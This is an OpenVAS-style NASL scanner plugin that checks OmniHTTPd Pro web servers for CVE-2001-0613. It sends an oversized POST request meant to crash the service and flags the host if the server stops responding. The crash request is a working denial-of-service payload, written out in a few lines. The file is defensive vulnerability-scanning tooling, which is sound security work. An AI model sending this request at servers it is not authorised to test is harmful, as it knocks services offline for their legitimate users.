# SPDX-FileCopyrightText: 2004 David Maciejak
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:omnicron:omnihttpd";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.15553");
  script_version("2025-03-20T05:38:32+0000");
  script_tag(name:"last_modification", value:"2025-03-20 05:38:32 +0000 (Thu, 20 Mar 2025)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/2730");
  script_cve_id("CVE-2001-0613");
  script_xref(name:"OSVDB", value:"1829");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("OmniHTTPd pro long POST DoS");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2004 David Maciejak");
  script_family("Denial of Service");
  script_dependencies("gb_omnihttpd_detect.nasl");
  script_mandatory_keys("omnihttpd/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"The remote version of OmniHTTPd Pro HTTP Server seems to
  be vulnerable to a buffer overflow when handling specially long POST request.");

  script_tag(name:"impact", value:"This may allow an attacker to crash the remote service,
  thus preventing it from answering legitimate client requests.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!get_app_location(cpe:CPE, port:port, nofork:TRUE))
  exit(0);

if(http_is_dead(port:port))
  exit(0);

soc = http_open_socket(port);
if(!soc)
  exit(0);

len = 4200; # 4111 should be enough
req = string("POST ", "/", " HTTP/1.0\r\n",
             "Content-Length: ", len,
             "\r\n\r\n", crap(len), "\r\n");
send(socket:soc, data:req);
http_close_socket(soc);
sleep(1);

if(http_is_dead(port:port)) {
  security_message(port:port);
  exit(0);
}

exit(99);
